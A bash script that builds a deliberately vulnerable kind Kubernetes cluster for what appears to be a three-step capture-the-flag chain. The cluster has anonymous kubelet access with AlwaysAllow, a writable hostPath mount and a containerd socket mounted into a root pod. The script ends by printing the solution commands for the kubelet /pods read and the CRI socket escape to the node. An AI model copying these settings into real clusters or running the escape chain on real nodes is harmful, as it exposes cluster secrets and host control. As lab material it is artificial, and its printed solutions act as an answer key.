#!/bin/bash
# Chain 11: hostPath → Kubelet → CRI Socket (3 steps)
set -euo pipefail
CLUSTER_NAME="cve-chain11-hostpath-node"
FLAG1="${CVE_FLAG1:-flag{chain11-step1-hostpath}}"
FLAG2="${CVE_FLAG2:-flag{chain11-step2-kubelet}}"
FLAG3="${CVE_FLAG3:-flag{chain11-step3-node-final}}"

echo "[Chain 11] hostPath to Node Control — 3 steps"

mkdir -p /home/kianabin/cve-flags/chain11
echo "$FLAG1" > /home/kianabin/cve-flags/chain11/flag.txt

kind create cluster --name "$CLUSTER_NAME" --config - << 'KINDCFG'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.27.3
    extraMounts:
      - hostPath: /home/kianabin/cve-flags/chain11
        containerPath: /host-flag
    kubeadmConfigPatches:
      - |
        kind: InitConfiguration
        nodeRegistration:
          kubeletExtraArgs:
            anonymous-auth: "true"
            authorization-mode: "AlwaysAllow"
KINDCFG

docker pull alpine:latest 2>/dev/null || true
kind load docker-image alpine:latest --name "$CLUSTER_NAME" 2>/dev/null || true
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10
kind load docker-image nginx:1.24-alpine --name "$CLUSTER_NAME" 2>/dev/null || true

# Step 1: writable hostPath pod (flag on the node, NOT mounted into the pod)
kubectl apply -f - << YAML
apiVersion: v1
kind: Pod
metadata:
  name: chain11-step1
spec:
  containers:
    - name: esc
      image: alpine:latest
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
      volumeMounts:
        - name: hl
          mountPath: /host-log
  volumes:
    - name: hl
      hostPath:
        path: /var/log
YAML

# Step 2: flag in a literal pod env (visible through anonymous kubelet /pods)
kubectl apply -f - << YAML
apiVersion: v1
kind: Pod
metadata:
  name: chain11-holder
spec:
  containers:
    - name: nginx
      image: nginx:1.24-alpine
      imagePullPolicy: IfNotPresent
      env:
        - name: FLAG
          value: "$FLAG2"
YAML

# Step 3: CRI socket pod (kubelet exec into it, then escape to the node)
docker build -t chain11-cri-pod:local -f - . << 'DOCKERFILE' 2>/dev/null || \
  echo "  Using alpine as fallback (install ctr manually in pod)"
FROM alpine:latest
RUN apk add --no-cache curl && \
    curl -sSL https://github.com/containerd/containerd/releases/download/v1.7.13/containerd-1.7.13-linux-amd64.tar.gz | \
    tar xz -C /usr/local bin/ctr
DOCKERFILE
kind load docker-image chain11-cri-pod:local --name "$CLUSTER_NAME" 2>/dev/null || true

kubectl apply -f - << YAML
apiVersion: v1
kind: Pod
metadata:
  name: chain11-cri
spec:
  containers:
    - name: attacker
      image: chain11-cri-pod:local
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
      securityContext:
        runAsUser: 0
      volumeMounts:
        - name: cri-sock
          mountPath: /run/containerd/containerd.sock
          readOnly: true
  volumes:
    - name: cri-sock
      hostPath:
        path: /run/containerd/containerd.sock
        type: Socket
YAML

# Final flag on the node (only reachable after escaping to the node)
NODE_CONTAINER=$(docker ps --filter "name=${CLUSTER_NAME}-control-plane" --format '{{.Names}}' 2>/dev/null || echo "")
if [ -n "$NODE_CONTAINER" ]; then
  docker exec "$NODE_CONTAINER" sh -c "echo '$FLAG3' > /etc/chain11_final_flag" 2>/dev/null || true
fi

kubectl wait --for=condition=Ready pod/chain11-step1 --timeout=60s 2>/dev/null || true
kubectl wait --for=condition=Ready pod/chain11-holder --timeout=60s 2>/dev/null || true
kubectl wait --for=condition=Ready pod/chain11-cri --timeout=60s 2>/dev/null || true
sleep 5

NODE_IP=$(kubectl get node -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
echo ""
echo "[Chain 11] Ready — 3 steps: hostPath → kubelet → CRI/node"
echo "    Step 1: kubectl exec chain11-step1 -- sh -c 'ln -sf /host-flag /host-log/flag-link; cat /host-log/flag-link/flag.txt'"
echo "    Step 2: curl -sk https://${NODE_IP}:10250/pods | grep -A2 chain11-holder"
echo "    Step 3: kubeletctl exec default chain11-cri -c attacker -- sh   (then ctr escape and cat /etc/chain11_final_flag)"
